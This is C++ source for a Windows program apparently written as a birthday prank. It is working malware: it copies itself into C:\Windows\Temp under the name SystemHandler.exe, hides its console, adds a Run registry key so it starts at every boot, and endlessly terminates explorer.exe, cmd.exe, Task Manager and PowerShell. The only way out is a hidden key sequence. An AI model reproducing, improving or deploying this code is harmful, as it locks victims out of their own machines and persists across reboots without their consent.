
#include<iostream>
#include <string>
#include <windows.h>
#include <unistd.h>
#include <tlhelp32.h>
//Happy Birthday Hami

#define _WIN32_WINNT 0x0500
#define BUFSIZE MAX_PATH
#define MAX_LENGTH 100

using namespace std;
char *process_name[]={"explorer.exe","cmd.exe","Taskmgr.exe","powershell"};
int proc_len=sizeof(process_name)/sizeof(char *);
int *proc_pid=new int[proc_len];

LPCSTR message="Happy Birthday Hami(:!!!";

LPCSTR new_exe_path="C:\\Windows\\Temp\\SystemHandler.exe";
string executable_path;


string pattern="MAHDIYAR";
string subpattern="";




int registry_key() {
HKEY hnd;
LPCSTR path="SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";


//HKEY_CURRENT_USER
//HKEY_LOCAL_MACHINE

if(RegCreateKeyEx(HKEY_LOCAL_MACHINE,path,0, NULL, 0,KEY_WRITE, NULL,
&hnd, REG_OPTION_NON_VOLATILE)==ERROR_SUCCESS){





if(RegSetValueExA(hnd, "xor", 0, REG_SZ, (BYTE*)new_exe_path, lstrlenA(new_exe_path))==ERROR_SUCCESS){cout << "key setted" << '\n' ;}

RegCloseKey(hnd);

}

return 0;

}



int* find_process(){


HANDLE hSnapshot;
for  (int i=0;i<proc_len;i++) {


  PROCESSENTRY32 pe;
  int pid = 0;
  BOOL hResult;

  // snapshot of all processes in the system
  hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  if (INVALID_HANDLE_VALUE == hSnapshot) return 0;

  // initializing size: needed for using Process32First
  pe.dwSize = sizeof(PROCESSENTRY32);

  // info about first process encountered in a system snapshot
  hResult = Process32First(hSnapshot, &pe);

  // retrieve information about the processes
  // and exit if unsuccessful
  while (hResult) {
    // if we find the process: return process ID
    if (strcmp(process_name[i], pe.szExeFile) == 0) {
      pid = pe.th32ProcessID;
      break;
    }
    hResult = Process32Next(hSnapshot, &pe);
  }
  //cout << i << ":" << pid << '\n';

if(pid){
  proc_pid[i]=pid;
}else{
  proc_pid[i]=0;

}


}
 CloseHandle(hSnapshot);
 return proc_pid;
}



int proc_killer(){
    HANDLE hnd;
    for (int i=0 ;i<proc_len;i++){

    hnd = OpenProcess(PROCESS_TERMINATE, false,(DWORD)proc_pid[i]);
    TerminateProcess(hnd, 1);
    }
    CloseHandle(hnd);

    return 0;

}

string get_directory() {
   TCHAR buffer[BUFSIZE];
   GetCurrentDirectoryA(BUFSIZE,buffer);
   return (string)buffer;
}


void copy_path(string exe_path){

WINBOOL stat;

cout << exe_path << '\n' << new_exe_path << '\n';

if(CopyFileA(exe_path.c_str(),new_exe_path,stat)!=0){cout << "operation done successfull" <<'\n';}
else{cout << "operation not successfull";}

return;
}


void message_box(){

MessageBoxA(NULL,message,"Written By M.R.A.F",MB_OK);

}




DWORD WINAPI check(LPVOID lpParameter){

while(true){

 if(subpattern.length()>=MAX_LENGTH && subpattern.find(pattern)==string::npos){subpattern.clear();}
 else if(subpattern.find(pattern)!=string::npos){message="Procedure Diactivated"; message_box(); exit(0); }
 for (int i=0;i<pattern.length();i++){

  if(GetKeyState(pattern[i]) & 0x8000){


    if(subpattern[subpattern.length()-1]!=pattern[i]){
     subpattern+= pattern[i];
    }
  }
 }



}

}


bool create_process(){
LPCSTR current_path="C:\\Windows\\Temp";
STARTUPINFO info={sizeof(info)};
PROCESS_INFORMATION processInfo;

if(CreateProcess(new_exe_path, NULL, NULL, NULL, FALSE, 0, NULL, current_path, &info, &processInfo)!=0){cout << "process created"  << '\n'; return true;}
else {cout << "cant create process"; return false; }

}




int main(){
    ///written by M.R.A.F

    executable_path=get_directory();
    executable_path.append("\\SystemHandler.exe");

    if(executable_path.compare(new_exe_path)!=0) {
            copy_path(executable_path);
            if(create_process()==true){ exit(1);}
    }






    HWND hWnd = GetConsoleWindow();
    ShowWindow( hWnd, SW_HIDE );

    unsigned int myCounter = 0;
    DWORD myThreadID;
    HANDLE myHandle = CreateThread(0, 0, check, NULL, 0, &myThreadID);
    if(myHandle==NULL){cout <<"Thread Creation Failed!!";}

    registry_key();

    bool sw=0;

    while(true){

        find_process();
        proc_killer();
        sleep(0.5);

        }





}
